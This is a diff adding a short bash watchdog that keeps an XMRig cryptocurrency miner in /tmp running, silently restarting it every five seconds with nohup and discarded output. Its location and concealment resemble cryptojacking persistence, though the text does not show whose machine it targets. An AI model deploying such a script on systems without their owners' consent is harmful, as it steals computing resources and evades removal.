@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# Path to miner binary and config
+MINER_PATH="/tmp/xmrig/xmrig-6.22.2/xmrig"
+CONFIG_PATH="/tmp/xmrig/xmrig-6.22.2/settings.json"
+
+# Infinite loop to monitor miner
+while true; do
+    if ! pgrep -f "$MINER_PATH" > /dev/null; then
+        echo "[!] Miner not running. Restarting..."
+        nohup "$MINER_PATH" -c "$CONFIG_PATH" > /dev/null 2>&1 &
+    fi
+    sleep 5
+done
